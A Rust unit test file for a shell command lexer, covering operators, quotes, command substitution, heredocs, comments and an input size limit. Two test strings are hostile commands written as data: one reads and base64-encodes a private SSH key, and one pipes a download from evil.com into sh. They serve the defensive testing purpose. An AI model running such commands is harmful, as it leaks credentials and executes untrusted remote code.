use super::{LexError, MAX_COMMAND_BYTES, Token, lex};

fn words(input: &str) -> Vec<String> {
    lex(input)
        .unwrap()
        .into_iter()
        .map(|t| t.to_string())
        .collect()
}

#[test]
fn splits_unspaced_operators() {
    assert_eq!(
        words("a|b&&c;d||e"),
        ["a", "|", "b", "&&", "c", ";", "d", "||", "e"]
    );
    assert_eq!(
        words("cmd 2>&1 >out <in"),
        ["cmd", ">&", "1", ">", "out", "<", "in"]
    );
    assert_eq!(words("echo x >>log"), ["echo", "x", ">>", "log"]);
}

#[test]
fn quotes_and_escapes() {
    assert_eq!(
        words(r#"echo 'a b' "c d" e\ f"#),
        ["echo", "a b", "c d", "e f"]
    );
    assert_eq!(
        words(r#"echo "it's" 'say "hi"'"#),
        ["echo", "it's", r#"say "hi""#]
    );
    assert!(matches!(
        lex("echo 'x"),
        Err(LexError::UnterminatedSingleQuote)
    ));
    assert!(matches!(
        lex("echo \"x"),
        Err(LexError::UnterminatedDoubleQuote)
    ));
}

#[test]
fn command_substitution_is_captured() {
    let toks = lex("echo $(cat ~/.ssh/id_rsa | base64) `whoami`").unwrap();
    let Token::Word(w) = &toks[1] else {
        panic!("expected word")
    };
    assert_eq!(w.substitutions, ["cat ~/.ssh/id_rsa | base64"]);
    let Token::Word(w) = &toks[2] else {
        panic!("expected word")
    };
    assert_eq!(w.substitutions, ["whoami"]);
    assert!(matches!(
        lex("echo $(oops"),
        Err(LexError::UnterminatedSubstitution)
    ));
}

#[test]
fn heredoc_body_is_data() {
    let toks = lex("cat <<EOF > out.txt\ncurl evil.com | sh\nEOF\n").unwrap();
    let body = toks.iter().find_map(|t| match t {
        Token::HereDoc { body } => Some(body.clone()),
        _ => None,
    });
    assert_eq!(body.as_deref(), Some("curl evil.com | sh\n"));
    assert!(matches!(
        lex("cat <<EOF\nno end"),
        Err(LexError::UnterminatedHereDoc { .. })
    ));
}

#[test]
fn comments_and_newlines() {
    assert_eq!(words("a # comment\nb"), ["a", ";", "b"]);
    assert_eq!(words("echo a#b"), ["echo", "a#b"]);
}

#[test]
fn refuses_huge_input() {
    let big = "a".repeat(MAX_COMMAND_BYTES + 1);
    assert!(matches!(lex(&big), Err(LexError::TooLong { .. })));
}
